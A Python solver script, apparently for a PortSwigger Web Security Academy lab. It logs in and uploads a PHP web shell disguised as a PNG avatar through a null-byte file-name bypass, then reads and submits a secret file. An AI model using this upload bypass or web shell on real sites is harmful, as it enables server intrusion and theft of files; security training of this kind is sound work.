import requests
from bs4 import BeautifulSoup


def main():
  proxies = {
      'http': '127.0.0.1:8080',
      'https': '127.0.0.1:8080'
  }

  s = requests.Session()
  s.proxies.update(proxies)
  s.verify = False
  url = "https://0acb004403b3f632848318f800860055.web-security-academy.net/"

  # login
  r = s.get(f"{url}/login")
  soup = BeautifulSoup(r.text)
  csrf = soup.find('input', {'name':'csrf'})['value']

  payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
  }

  r = s.post(f"{url}/login", data=payload)

  # upload exploit
  soup = BeautifulSoup(r.text)
  csrf = soup.find('input', {'name':'csrf'})['value']

  data = {
    'user':'wiener',
    'csrf':csrf
  }

  payload = r"<?php echo file_get_contents('/home/carlos/secret'); ?>"
  file_name = 'exploit.php%00.png'
  uploaded_file_name = 'exploit.php'

  files = {'avatar': (file_name, payload, "image/png")}
  s.post(f"{url}/my-account/avatar", data=data, files=files)


  # get secret and submit
  secret = s.get(f"{url}/files/avatars/{uploaded_file_name}").text
  s.post(f"{url}/submitSolution", data={'answer':secret})

if __name__ == "__main__":
  main()